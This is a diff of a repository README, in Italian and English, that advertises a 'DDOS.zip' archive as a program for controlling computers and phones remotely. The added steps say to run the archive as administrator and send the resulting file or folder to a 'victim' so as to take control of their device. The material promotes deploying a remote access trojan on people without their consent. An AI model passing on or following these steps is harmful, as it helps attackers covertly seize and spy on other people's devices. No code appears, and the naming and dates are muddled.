@@ -1,3 +1,11 @@
 # database
 Creo programmi per controllare pc,telefoni,tablet, altri programmi complicati.
-il file DDOS.zip è un programma che permette di controllare il pc da remoto trovate il link al video che caricherò sul mio canale il 019/02/2023
+il file DDOS.zip è un programma che permette di controllare il pc da remoto.
+
+1 STEP(LAST STEP):
+ESTRACT THE ZIP FILE AND OPEN WITH "RUN AS ADMINISTRATOR" AND WAIT UNTIL 2 SECONDS AND 
+YOUR GONNA HAVE A FILE INSTALLED IN YOUR PC AUTOMATICALLY AND GIVE THAT FILE TO A PERSON "VICTIM".
+
+
+1 COSA DA FARE:
+ESTRAI IL FILE ZIP E CLICCA 2 VOLTE IL FILE "CLIENT" UNA VOLTA FATTO CIò VI SI INSTALLERà UNA CARTELLA CHE DOVETE MANDARLA ALLA VOSTRA VITTIMA PER CONTROLLARE IL PC O IL TELEFONO, USALA CON SAGGEZZA!
